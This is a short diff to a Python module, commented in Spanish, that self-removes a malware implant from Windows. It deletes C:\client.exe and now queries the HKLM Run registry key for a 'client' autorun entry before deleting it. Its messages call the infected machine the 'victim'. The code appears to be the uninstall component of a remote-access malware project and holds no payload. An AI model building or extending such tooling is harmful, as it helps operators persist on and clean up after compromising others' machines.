@@ -2,6 +2,7 @@
 # MODULO PARA AUTOREMOVER EL MALWARE -> CREADO POR KIRARI
 
 import os
+import subprocess
 
 def windows_autoremover():
 
@@ -25,10 +26,15 @@ def windows_autoremover():
 		destino = "C:\\client.exe"
 		if os.path.isfile(destino):
 			os.remove(destino)
-		
-		os.system('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /f')
 
-		return (True,"\n Bicho eliminado con exito \n")
+		verficar = subprocess.Popen('REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /s',shell=True,stdout=subprocess.PIPE)
+			
+		if (b'client.exe' in verficar.stdout.read()):
+			os.system('reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /f')
+			return (True,"\n Bicho eliminado con exito \n")
+
+		else:
+			return (True,"\n No se ha encontrado un bicho implantado en el cerebro victima \n")
 
 
 def linux_autoremover():
